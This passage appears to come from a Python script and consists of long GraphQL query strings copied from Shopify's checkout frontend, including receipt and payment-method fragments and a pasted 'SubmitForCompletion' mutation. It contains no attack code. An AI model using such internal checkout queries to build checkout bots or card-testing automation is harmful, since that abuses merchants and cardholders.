paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

# PASTE MUTATION_SUBMIT HERE
MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties 